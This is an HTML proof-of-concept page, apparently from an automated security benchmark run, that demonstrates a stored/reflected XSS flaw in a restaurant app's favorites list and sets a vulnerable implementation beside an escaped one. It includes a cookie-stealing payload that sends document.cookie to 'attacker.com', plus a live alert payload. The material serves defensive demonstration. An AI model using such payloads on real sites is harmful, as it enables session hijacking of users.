<!-- 
POC: HTML demonstration of XSS vulnerability in favorite restaurants display showing vulnerable vs safe implementation
Target: ./repo
Created: 2025-11-07T19:43:46.281Z
Session: benchmark-XBEN-069-24-mhp8x6to

To test this POC:
1. Open this file in a web browser: file:///home/daytona/.pensar/executions/benchmark-XBEN-069-24-mhp8x6to/pocs/poc_xss_favorite_restaurants_v2.html
2. Or serve it and navigate to the target application
3. Observe the vulnerability demonstration (e.g., XSS alert, CSRF execution)
-->

<!DOCTYPE html>
<html>
<head>
    <title>XSS PoC - Favorite Restaurants Display</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
</head>
<body>
    <div class="container mt-5">
        <h1>XSS Vulnerability PoC: Favorite Restaurants Display</h1>
        
        <div class="alert alert-danger">
            <strong>Vulnerability:</strong> Reflected/Stored XSS in /profile.php
        </div>
        
        <h3>Vulnerable Code:</h3>
        <pre><code>restaurants.forEach(function(restaurant) {
    var imageSrc = 'static/images/restaurant' + imageIndex + '.jpg';
    list.append(
        '&lt;li class="list-group-item favorite-restaurant"&gt;' +
        '&lt;img src="' + imageSrc + '" style="height: 50px; width: 50px; margin-right: 10px;" alt="' + restaurant + '"&gt;' +
        restaurant +  // &lt;-- VULNERABLE: Direct insertion without escaping
        '&lt;/li&gt;'
    );
});</code></pre>
        
        <h3>Attack Scenario:</h3>
        <p>If an attacker could modify a restaurant name (via IDOR vulnerability or direct API write access), they could inject malicious JavaScript:</p>
        
        <pre><code>Malicious Restaurant Name:
&lt;img src=x onerror='fetch("http://attacker.com/steal?cookie="+document.cookie)'&gt;</code></pre>
        
        <h3>Live Demonstration:</h3>
        <p>The code below demonstrates how the vulnerability works:</p>
        
        <div id="vulnerable-demo" class="border p-3 mb-3">
            <h4>Vulnerable Implementation (Direct Concatenation):</h4>
            <ul id="vulnerable-list" class="list-group"></ul>
        </div>
        
        <div id="safe-demo" class="border p-3">
            <h4>Safe Implementation (Using .text()):</h4>
            <ul id="safe-list" class="list-group"></ul>
        </div>
        
        <h3 class="mt-4">Results:</h3>
        <div id="results" class="alert alert-info"></div>
    </div>
    
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
        // Test data with XSS payload
        var restaurants = [
            "Pizza Palace",
            "<img src=x onerror=\"console.log('XSS VULNERABILITY DEMONSTRATED'); alert('XSS: ' + document.domain);\">Malicious Restaurant",
            "Burger Barn"
        ];
        
        var resultsDiv = $('#results');
        var vulnerableDetected = false;
        
        // VULNERABLE VERSION - Direct concatenation
        var vulnerableList = $('#vulnerable-list');
        restaurants.forEach(function(restaurant, index) {
            var imageSrc = 'static/images/restaurant' + (index % 10) + '.jpg';
            vulnerableList.append(
                '<li class="list-group-item favorite-restaurant">' +
                '<img src="' + imageSrc + '" style="height: 50px; width: 50px; margin-right: 10px;" alt="' + restaurant + '">' +
                restaurant +  // VULNERABLE
                '</li>'
            );
        });
        
        // Check if XSS executed in vulnerable version
        if (vulnerableList.html().includes('onerror=')) {
            resultsDiv.append('<p><strong style="color:red;">✗ VULNERABLE:</strong> XSS payload present in vulnerable implementation</p>');
            vulnerableDetected = true;
        }
        
        // SAFE VERSION - Using jQuery text()
        var safeList = $('#safe-list');
        restaurants.forEach(function(restaurant, index) {
            var imageSrc = 'static/images/restaurant' + (index % 10) + '.jpg';
            var li = $('<li>').addClass('list-group-item favorite-restaurant');
            var img = $('<img>')
                .attr('src', imageSrc)
                .attr('alt', restaurant)
                .css({'height': '50px', 'width': '50px', 'margin-right': '10px'});
            var text = $('<span>').text(restaurant);  // SAFE: text() escapes content
            li.append(img).append(text);
            safeList.append(li);
        });
        
        // Verify safe version doesn't contain executable code
        if (!safeList.html().includes('onerror=')) {
            resultsDiv.append('<p><strong style="color:green;">✓ SAFE:</strong> XSS payload properly escaped in safe implementation</p>');
        }
        
        if (vulnerableDetected) {
            resultsDiv.append('<p><strong style="color:red;">VULNERABILITY CONFIRMED:</strong> The vulnerable code directly concatenates user input into HTML, allowing XSS execution.</p>');
        }
    </script>
</body>
</html>